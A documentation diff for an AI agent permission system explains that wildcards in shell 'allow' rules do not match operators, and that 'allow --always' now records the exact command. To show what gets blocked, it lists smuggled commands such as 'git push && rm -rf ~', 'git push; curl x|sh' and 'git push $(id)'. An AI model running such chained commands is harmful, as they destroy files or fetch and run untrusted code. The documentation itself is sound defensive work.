@@ -241,6 +241,14 @@ reads `allow Read`, `ask Bash(git push*)` or `deny Write(/etc/*)`, the strictest
 match wins, and an agent's own `APPROVALS` file can only tighten what the daemon
 set, never widen it.
 
+In an `allow` rule on a shell command, `*` and `?` never cover a shell operator
+(`; & | ` $ < > ( )`) or a line break, so `allow Bash(git push*)` passes
+`git push origin feat/x` but not `git push && rm -rf ~`, `git push; curl x|sh`
+or `git push $(id)`. An operator written out in the rule matches literally:
+`allow Bash(make build && make test)` covers exactly that command. `deny` and
+`ask` rules keep their wildcards unrestricted, so `deny Bash(rm -rf /*)` also
+blocks `rm -rf /x; ls`.
+
 On `ask` the question goes to the session's own gateways as a menu of four
 answers, and the tool call waits. The four are:
 
@@ -248,11 +256,10 @@ answers, and the tool call waits. The four are:
 - `allow --session`: this call runs, and the same call passes for the rest of
   the session. The grant lives with the session and ends when it stops.
 - `allow --always`: this call runs, and a rule is written the way `approve rule`
-  writes one, so it keeps passing after restarts. For a shell command the rule
-  names its first two words and what follows them (`Bash(git push*)`; a
-  one-word command stays exact); other tools name the exact subject. The menu
-  shows the rule before you press it. A subject holding a wildcard or a line
-  break gets no rule, and the operator is told so.
+  writes one, so it keeps passing after restarts. The rule names the exact
+  subject as it ran (`Bash(git push origin feat/x)` for a shell command), and
+  the menu shows the rule before you press it. A subject holding a wildcard, a
+  shell operator or a line break gets no rule, and the operator is told so.
 - `deny`, optionally with `--reason`: the call is refused, and the reason is
   what the agent reads in its refusal.
 
@@ -613,8 +620,9 @@ installed (`fc-list` on Linux, `~/Library/Fonts` on macOS), absent, or unknown.
 `f` opens the INSTALLER OBEL MONO block: the install command, which `c` copies,
 and the configuration for the terminal it detects, which `y` copies. The TUI
 never writes that configuration and never runs the install script. Obel Mono
-Masked is the family for terminals without feature settings, since `ss01` hides
-API keys on screen while the clipboard keeps the full text. Échap closes the
+Masked is the family for kitty and Alacritty, which cannot take `ss01` reliably
+here; WezTerm and foot select Obel Mono with `ss01`, which hides API keys on
+screen while the clipboard keeps the full text. Échap closes the
 block first.
 
 The preview sits beside the list from 100 columns, and under it below that. When
